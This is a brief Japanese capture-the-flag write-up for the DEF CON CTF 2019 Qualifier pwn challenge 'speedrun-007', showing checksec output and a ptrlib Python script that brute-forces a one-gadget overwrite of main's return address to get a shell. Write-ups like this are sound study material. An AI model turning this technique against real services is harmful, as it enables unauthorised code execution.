# [pwn 5pts] speedrun-007 - DEF CON CTF 2019 Qualifier
64ビットでSSPは無効です。
```
$ checksec -f speedrun-007
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      No	0		2	speedrun-007
```
スタック上のバッファを基点とした相対アドレスに任意回数書き込める。
メモリリークが無いのでmainのリターンアドレスをone gadgetに変える。

```python
from ptrlib import *
from time import sleep

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

payload = b'\x22\x33\xa3'

#log.level = ['warning']
while True:
    sock = Process("./speedrun-007")
    sock.send("hello")
    for i in range(len(payload)):
        sock.recvuntil("(y/n)?")
        sock.send("y")
        sock.send(p16(0x638 + i))
        sock.send(bytes([payload[i]]))
    sock.send("n")
    sock.recvuntil("L8R.\n")
    sock.sendline("id")
    l = sock.recv(timeout=0.1)
    if l:
        print(l)
        break
    l = sock.recv(timeout=0.1)
    if l:
        print(l)
        break
    sock.close()
    sleep(0.1)
```
ローカルでは動きませんでした。

# 感想
ブルートフォース面白くない。

# 参考文献
[1] [https://go-madhat.github.io/speedrun/](https://go-madhat.github.io/speedrun/)